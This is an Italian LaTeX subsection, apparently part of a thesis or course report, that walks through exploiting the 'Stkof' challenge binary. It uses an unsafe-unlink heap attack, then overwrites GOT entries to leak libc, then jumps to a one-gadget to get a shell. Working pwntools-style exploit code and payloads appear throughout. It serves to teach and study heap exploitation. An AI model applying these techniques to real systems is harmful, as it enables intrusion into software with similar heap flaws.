\subsection{Stkof}\label{cap:stkof}
\emph{Stkof} è un eseguibile che offre le seguenti operazioni, su un array \verb+G+ di \verb+0x100000+ puntatori, contenuto nella sezione \verb+.bss+:
\begin{enumerate}
	\item \emph{alloc(n)}: alloca un array di \verb+n+ byte e lo inserisce nella prossima posizione libera di \verb+G+ a partire da 1 (questa viene incrementata di volta in volta, senza mai essere decrementata)
	\item \emph{read(index, size, data)}: inserisce in posizione \verb+index+ di \verb+G+ una stringa \verb+data+ di lunghezza \verb+size+ da stdin. Questa è la funzione presenta una vulnerabilità. E' infatti possibile effettuare un overflow
	\item \emph{dealloc(index)}: libera la posizione \verb+index+ di \verb+G+
\end{enumerate}

Eseguando un checksec sull'eseguibile, si può vedere che il binario è compilato a 64 bit, che non ha PIE abilitato e che è Partial RELRO, per cui è possibile sovrascrivere la tabella \verb+.got+:

\begin{Verbatim}[commandchars=\\\{\}]
    Arch:     amd64-64-little
    RELRO:    \textcolor{red}{Partial RELRO}
    Stack:    \textcolor{green}{Canary found}
    NX:       \textcolor{green}{NX enabled}
    PIE:      \textcolor{red}{No PIE (0x400000)}
\end{Verbatim}

L'exploit si basa sull'attacco denominato \emph{unsafe unlink}, secondo cui si fa credere alla \verb+free + l'esistenza di un chunk non esistente, perchè non ottenuto da una chiamata a \verb+malloc+, che consente alla fine di avere un \emph{arbitrary write} su un indirizzo a propria scelta.

\begin{lstlisting}[style=PyStyle]
alloc(0x80)


alloc(0x80)
alloc(0x80)

ptr_addr = 0x602150
sizeof_ptr = 8

payload =  p64(0)*2
payload += p64(ptr_addr - sizeof_ptr*3)      # FD
payload += p64(ptr_addr - sizeof_ptr*2)      # BK
payload += p64(0)*12
payload += p64(0x80)                         # fake prev_size
payload += p64(0x90)                         # chunk size (bit prev in use = 0)

read(2, payload)
dealloc(3)
\end{lstlisting}

Si inizia allocando due buffer, \verb+buf1+ e \verb+buf2+, di dimensione 0x80, in modo da superare la dimensione del più grande fastbin, occupando quindi le posizioni 2 e 3 di \verb+G+\footnote{la prima \verb+alloc+ 
poteva essere evitata, ma serve solo per facilitare alcuni conti}.

Dopo aver allocato i due buffer, si crea un chunk fake all'interno di \verb+buf1+ scrivendo in posizione 2 e 3\footnote{considerato un buffer di puntatori, quindi di 8 byte in architettura a 64 bit} rispettivamente \verb+ptr_addr - sizeof_ptr*3+ e \verb+ptr_addr - sizeof_ptr*2+, che corrispondono ai puntatori \verb+FD+ e \verb+BK+ in un chunk vuoto. \verb+ptr_addr+ è un puntatore a puntatore, che punta al puntatore di \verb+buf1+(corrisponde a \verb+&G[2]+).
Questi valori non sono casuali, ma servono per bypassare il secondo controllo dell'\verb+unlink+ nella \verb+free+:

\begin{lstlisting}[style=CStyle]
#define unlink(AV, P, BK, FD) {                                            
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))
      malloc_printerr ("corrupted size vs. prev_size");			      
    FD = P->fd;
    BK = P->bk;
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))
      malloc_printerr ("corrupted double-linked list");
    else {
        FD->bk = BK;
        BK->fd = FD;		//[X]
      	
      	/* other code */
    }
}
\end{lstlisting}

Questo frammento di codice estrae un chunk libero da un bin.
Il controllo che in questo caso verrà superato è \verb+P->fd->bk == P+ e \verb+P->bk->fd == P+.

Essendo inoltre i chunk di \verb+buf1+ e \verb+buf2+ contigui in memoria ed essendo possibile un overflow su \verb+buf1+, si modifica la \verb+prev_size+ del chunk di \verb+buf2+ a 0x80\footnote{il valore in questo caso sarebbe stato 0x90}, per far credere alla \verb+free+ che il chunk di \verb+buf1+ è in realtà più piccolo, e si setta il bit \verb+prev_in_use+ a 0, per far credere alla \verb+free+ che il chunk precedente è libero.

Viene quindi deallocato \verb+buf2+ e, poichè la sua dimensione non rientra in un fastbin, il chunk viene consolidato con il precedente\footnote{che è libero secondo i metadati letti dalla \verb+free+} e viene chiamato l'\verb+unlink+.
Questo porta, grazie all'operazione conterassegnata con \verb+[X]+ nell'\verb+unlink+, a sovrascrivere il puntatore a puntatore a \verb+buf1+ con l'\verb+FD+ iniettato in \verb+buf1+, che in questo caso è \verb+0x602138+.
Grazie a questo è possibile sovrascrivere, scrivendo su \verb+G[2]+, qualsiasi puntatore in \verb+G+.

\begin{lstlisting}[style=PyStyle]
payload =  p64(0)*2
payload += p64(e.got['puts'])
payload += p64(e.got['free'])
read(2, payload)
\end{lstlisting}

In questo caso viene modificato \verb+G[1]+ e \verb+G[2]+ rispettivamente con l'indirizzo della \verb+.got+ di \verb+puts+ e di \verb+free+.

\paragraph{Leak del base address della libc}
La seguente istruzione eseguita nell'exploit sovrascrive l'indirizzo di jump della \verb+free+ nella \verb+.got+, con l'indirizzo della \verb+.plt+ di \verb+puts+:

\begin{lstlisting}[style=PyStyle]
read(2, p64(e.plt['puts']+0x6))
\end{lstlisting}

In questo modo ora la \verb+free+ in realtà esegue una \verb+puts+.
Con la seguente invece, si esegue una \verb+free+ su \verb+G[1]+, e quindi in realtà una \verb+puts+ di \verb+G[1]+, ovvero dell'indirizzo proprio della \verb+puts+.

\begin{lstlisting}[style=PyStyle]
dealloc(1)
\end{lstlisting}

Con l'ultima istruzione si ottiene quindi l'indirizzo della libc, sottraendo l'offset \verb+0x6e570+ dall'indirizzo della \verb+puts+ nella libc.

\begin{lstlisting}[style=PyStyle]
libc_addr = u64((p.readline().rstrip().ljust(8, '\x00'))) - 0x6e570
\end{lstlisting}

\paragraph{Ottenimento della shell}
Avendo ora il base address della libc, con il tool \verb+magic.py+\cite{magicpy} si identifica l'offset del \emph{magic gadget} per ottenere una shell. Questo indirizzo viene sostituito nuovamente al posto della \verb+free + e nuovamente con un \verb+dealloc+, si va a richiamare la \verb+free+ nel codice, che corrisponde ora ad una \verb+exec("/bin/sh")+:

\begin{lstlisting}[style=PyStyle]
read(2, p64(libc_addr + 0x45682))             # magic gadget
dealloc(2)
\end{lstlisting}